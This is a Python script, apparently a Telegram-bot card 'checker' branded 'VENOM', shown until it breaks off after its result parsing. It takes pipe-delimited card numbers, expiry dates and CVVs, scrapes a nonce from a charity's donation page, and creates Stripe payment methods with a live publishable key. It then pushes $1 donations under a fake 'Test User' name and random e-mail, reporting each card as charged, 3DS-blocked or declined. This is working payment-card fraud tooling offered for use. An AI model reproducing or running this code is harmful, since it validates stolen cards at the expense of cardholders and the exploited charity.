import requests, re, random, string, time

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'

def custom_charge(card_data: str):
    start_time = time.time()
    try:
        cc, mm, yy, cvv = card_data.strip().split("|")
    except:
        return f"{card_data}", "Bad Format", False, 0, "❌ Bad Format"

    user = generate_user_agent()
    acc = generate_random_account()
    session = requests.Session()

    # ================== STEP 1: Get Nonce ================== #
    headers_nonce = {
        "authority": "needhelped.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "referer": "https://needhelped.com/campaigns/poor-children-donation-4/donate/",
        "upgrade-insecure-requests": "1",
        "user-agent": user,
    }
    r0 = session.get("https://needhelped.com/campaigns/poor-children-donation-4/donate/", headers=headers_nonce)
    match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', r0.text)
    if not match:
        return f"{card_data}", "Nonce Error", False, 0, "❌ Failed to get nonce"
    nonce = match.group(1)

    # ================== STEP 2: Create Payment Method (Stripe) ================== #
    headers_pm = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": user,
    }
    data_pm = f"type=card&billing_details[name]=Test+User&billing_details[email]={acc}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr"
    r1 = session.post("https://api.stripe.com/v1/payment_methods", headers=headers_pm, data=data_pm)

    if r1.status_code != 200 or "id" not in r1.json():
        msg = r1.json().get("error", {}).get("message", "Declined ❌")
        return f"{card_data}", msg, False, 0, f"❌ Declined → {msg}"
    pm_id = r1.json()["id"]

    # ================== STEP 3: Make Donation (1$ Fixed) ================== #
    headers_pay = {
        "authority": "needhelped.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://needhelped.com",
        "referer": "https://needhelped.com/campaigns/poor-children-donation-4/donate/",
        "user-agent": user,
        "x-requested-with": "XMLHttpRequest",
    }
    data_pay = {
        "_charitable_donation_nonce": nonce,
        "campaign_id": "1164",
        "description": "Donation",
        "donation_amount": "custom",
        "custom_donation_amount": "1.00",   # ← دايمًا 1 دولار
        "first_name": "Test",
        "last_name": "User",
        "email": acc,
        "gateway": "stripe",
        "stripe_payment_method": pm_id,
        "action": "make_donation",
    }
    r2 = session.post("https://needhelped.com/wp-admin/admin-ajax.php",
                      headers=headers_pay, data=data_pay)

    execution_time = time.time() - start_time

    # حاول نفك JSON
    try:
        response = r2.json()
    except Exception:
        # لو الرد مش JSON
        short_text = r2.text[:200]  # أول 200 حرف بس
        msg = f"Invalid Response ❌ (HTTP {r2.status_code})"
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=1861702459'> VENOM </a>  ]═════
⌬ ᴄᴀʀᴅ : {card_data}
⌬ sᴛᴀᴛᴜs : {msg}
⌬ ᴛɪᴍᴇ   : {execution_time:.2f}s
⌬ ʀᴇsᴘᴏɴsᴇ : {short_text}
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=1861702459'>VENOM</a> 』══
"""
        return f"{card_data}", msg, False, 0, bot_msg

    # ================== STEP 4: Parse Result ================== #
    if response.get("success") and not response.get("requires_action"):
        msg = "CHARGED 1$ 🔥"
        send = True
    elif response.get("requires_action"):
        msg = "OTP / 3DS ❌"
        send = False
    else:
        msg = f"DECLINED ❌ → {response.get('errors','Failed')}"
        send = False
